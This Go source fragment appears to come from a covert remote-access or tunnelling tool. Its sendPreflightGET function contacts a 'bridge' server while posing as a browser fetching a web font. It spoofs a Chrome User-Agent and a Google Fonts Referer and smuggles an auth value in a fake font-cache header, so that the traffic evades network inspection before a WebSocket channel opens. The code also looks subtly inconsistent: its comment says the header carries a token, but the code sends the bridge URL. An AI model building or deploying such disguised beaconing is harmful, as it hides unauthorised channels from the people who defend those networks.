package main

import (
	"context"
	"io"
	"net/http"
	"time"

)

// sendPreflightGET masquerades as a font CDN fetch (GET /api/v1/chat).
// The auth token is smuggled in the X-Font-Cache-Verify header as
// "target_id.token". The bridge validates it, registers our IP for the
// subsequent WS upgrade, and returns WOFF2 magic bytes so this looks like
// a browser loading a web font to any DPI/proxy on the path.
func sendPreflightGET(ctx context.Context, baseURL string) bool {
	endpoint := baseURL + "/api/v1/chat"

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, endpoint, nil)
	if err != nil {
		debugLog.Printf("preflight: build request: %v", err)
		return false
	}

	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	req.Header.Set("Referer", "https://fonts.googleapis.com/")

	authBlob := targetID + "." + bridgeURL
	req.Header.Set("X-Font-Cache-Verify", authBlob)

	client := stealthHTTPClient()
	client.Timeout = 15 * time.Second

	resp, err := client.Do(req)
	if err != nil {
		debugLog.Printf("preflight: %v", err)
		return false
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)

	// Bridge returns 200 + font/woff2 on success, 404 on bad token
	ok := resp.StatusCode == 200
	if !ok {
		debugLog.Printf("preflight: status %d", resp.StatusCode)
	}
	return ok
}
